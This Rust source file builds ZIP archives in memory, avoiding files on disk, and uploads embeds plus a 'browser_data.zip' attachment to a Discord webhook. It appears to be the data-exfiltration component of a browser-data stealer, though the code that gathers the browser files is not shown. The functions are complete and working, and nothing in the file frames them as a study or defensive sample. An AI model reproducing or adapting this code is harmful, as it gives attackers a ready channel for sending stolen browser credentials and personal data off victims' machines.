use std::io::Write;
use zip::write::FileOptions;

/// Build a ZIP archive entirely in memory (no temp files on disk).
pub fn build_zip_in_memory(files: &[(String, String)]) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let mut buffer = Vec::new();
    {
        let mut zip = zip::ZipWriter::new(std::io::Cursor::new(&mut buffer));
        let options = FileOptions::default().compression_method(zip::CompressionMethod::Deflated);

        for (name, content) in files {
            zip.start_file(name, options)?;
            zip.write_all(content.as_bytes())?;
        }

        zip.finish()?;
    }
    Ok(buffer)
}

/// Send Discord embeds and optional browser ZIP in a single webhook message.
pub async fn send_combined(
    client: &reqwest::Client,
    webhook_url: &str,
    embeds: &[serde_json::Value],
    browser_files: &[(String, String)],
) -> Result<(), Box<dyn std::error::Error>> {
    let has_embeds = !embeds.is_empty();
    let has_files = !browser_files.is_empty();

    if !has_embeds && !has_files {
        crate::log::log("webhook skipped: nothing to send");
        return Ok(());
    }

    let payload = serde_json::json!({ "embeds": embeds });

    if has_files {
        crate::log::log(&format!("zip building (in-memory): {} entries", browser_files.len()));
        let zip_data = build_zip_in_memory(browser_files)?;
        crate::log::log(&format!("zip size: {} bytes", zip_data.len()));

        let zip_part = reqwest::multipart::Part::bytes(zip_data)
            .file_name("browser_data.zip")
            .mime_str("application/zip")?;

        let form = reqwest::multipart::Form::new()
            .text("payload_json", serde_json::to_string(&payload)?)
            .part("file", zip_part);

        let response = client.post(webhook_url).multipart(form).send().await?;
        let status = response.status();
        let body = response.text().await.unwrap_or_default();
        crate::log::log(&format!(
            "webhook combined send: {} embed(s), zip attached, HTTP {status}",
            embeds.len()
        ));
        if !status.is_success() {
            crate::log::log(&format!("webhook combined body: {body}"));
            return Err(format!("webhook failed: {status} {body}").into());
        }
    } else {
        let response = client.post(webhook_url).json(&payload).send().await?;
        let status = response.status();
        let body = response.text().await.unwrap_or_default();
        crate::log::log(&format!(
            "webhook embed send: {} embed(s), HTTP {status}",
            embeds.len()
        ));
        if !status.is_success() {
            crate::log::log(&format!("webhook embed body: {body}"));
            return Err(format!("webhook failed: {status} {body}").into());
        }
    }

    Ok(())
}
